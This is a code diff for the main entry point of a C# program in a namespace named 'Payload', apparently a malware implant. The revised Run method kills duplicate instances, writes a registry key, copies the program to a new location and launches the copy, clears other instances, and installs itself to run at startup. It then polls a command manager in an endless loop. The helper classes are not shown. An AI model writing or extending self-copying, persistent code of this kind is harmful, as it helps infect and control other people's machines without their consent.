@@ -10,6 +10,7 @@ using System.Threading;
 using System.Threading.Tasks;
 using System.Security.Principal;
 using System.Security.AccessControl;
+using System.IO;
 
 namespace Payload
 {
@@ -17,23 +18,41 @@ namespace Payload
     {
         static void Main(string[] args)
         {
-            AppDomain.CurrentDomain.ProcessExit += CurrentDomain_ProcessExit;
-
-            new RegistryKeyCommand().Execute();
+            try
+            {
+                Run();
+            }
+            catch(Exception e)
+            {
+                TextHelper.WriteError(e.Message);
+                TextHelper.WriteError(e.StackTrace);
+            }
+        }
+        
+        static void Run()
+        {
 
             new KillOtherMeCommand().Execute();
 
-            new ConsoleLogCommand().Execute<String>($"Task Interval : {TextHelper.GenTimeSpanFromMillisec(Config.Instance.MainSleepInterval)}");
+            new RegistryKeyCommand().Execute();
+
+            if (new CopyItselfCommand().Execute() == null)
+                new StartProcessFactory().CreateCommand().Execute();
+            else
+                new ClearOtherPatchCommand().Execute();
             
+
+            new StartupSetupCommand().Execute();
+
+            new ConsoleLogCommand().Execute<String>($"Task Interval : {TextHelper.GenTimeSpanFromMillisec(Config.Instance.MainSleepInterval)}");
+
+            Command.CommandManager.Instance.RegisterTask();
+
             while (true)
             {
                 Command.CommandManager.Instance.Run();
                 Thread.Sleep(Config.Instance.MainSleepInterval);
             }
-        }
-
-        private static void CurrentDomain_ProcessExit(object sender, EventArgs e)
-        {
         }
     }
 }
